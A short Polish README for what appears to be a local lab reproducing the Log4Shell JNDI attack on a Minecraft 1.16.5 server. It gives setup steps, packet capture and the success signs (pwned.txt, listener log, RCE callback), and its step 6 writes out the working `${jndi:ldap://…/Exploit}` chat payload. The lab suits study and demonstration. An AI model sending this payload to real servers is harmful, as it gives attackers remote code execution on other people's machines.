# Trigger z klienta Minecraft

1. Capture (pcap): raz `./scripts/setup-capture.sh` (sudo/setcap), potem
   `./scripts/start-monitor.sh` → `evidence/lab-*.pcap`.
2. `./scripts/start-mc-server.sh` → `127.0.0.1:25565`, wersja **1.16.5**, offline.
   Przy starcie włącza też **mc-feed** (RCON) — na czacie widać etapy łańcucha.
3. Klient 1.16.5 (np. Prism), konto offline.
4. Połączenie: `127.0.0.1:25565`.
5. Uruchomiona infrastruktura ataku (LDAP/HTTP/listener) albo wcześniejszy
   `run-full-lab` bez `stop`.
6. Na czacie: `${jndi:ldap://127.0.0.1:1389/Exploit}`
7. Sukces: `evidence/pwned.txt`, wpis w `run/listener.log`, oraz kolejne
   komunikaty `[PCYB]` na czacie (LDAP → HTTP → callback → RCE).

Bez GUI: `./scripts/run-vulnerable.sh`.

RCON ręcznie: `python3 scripts/mc-rcon.py --say 'test'`  
Wyłączenie feedu: `PCYB_MC_FEED=0 ./scripts/start-mc-server.sh`
